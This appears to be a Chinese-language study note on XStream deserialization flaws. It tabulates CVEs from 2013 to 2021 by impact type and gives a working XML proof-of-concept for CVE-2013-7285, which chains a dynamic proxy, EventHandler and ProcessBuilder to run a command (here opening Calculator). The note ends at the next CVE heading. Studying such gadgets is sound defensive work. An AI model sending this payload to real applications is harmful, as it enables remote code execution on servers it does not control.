# 简介

当用户可控的输入直接作为xstream.fromXML(xml)的参数时，可能导致反序列化漏洞，目前为止涉及的cve如下：


|CVE ID |	PoC           |desc| 
| ---- | ---- | ---- | 
|CVE-2013-7285  | | <= 1.4.6|
|CVE-2021-39139	| RCE           | JDK版本要在7u21及以下 |
|CVE-2021-39140	| DoS           |        |
|CVE-2021-39141	| JNDI Based RCE|        |
|CVE-2021-39144	| RCE           | 无限制  |    
|CVE-2021-39145	| JNDI Based RCE|        |
|CVE-2021-39146	| JNDI Based RCE|        |
|CVE-2021-39147	| JNDI Based RCE|        |
|CVE-2021-39148	| JNDI Based RCE|        |
|CVE-2021-39149	| RCE           | 无限制  |
|CVE-2021-39150	| SSRF          |        |
|CVE-2021-39151	| JNDI Based RCE|        |
|CVE-2021-39152	| SSRF          |        |
|CVE-2021-39153	| RCE           | JDK版本限制在8到14且要求同时安装了JavaFX |
|CVE-2021-39154	| JNDI Based RCE|        |



## CVE-2013-7285

poc:

```
<sorted-set>
    <string>foo</string>
    <dynamic-proxy> <!-- Proxy 动态代理，handler使用EventHandler -->
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>open</string>
                    <string>/Applications/Calculator.app</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

### CVE-2013-7285原理
调用链的DynamicProxyConverter#unmarshal方法中，会调用到Proxy.newProxyInstance(this.classLoaderReference.getReference(), interfacesAsArray, handler)，java动态代理机制，


## CVE-2021-39139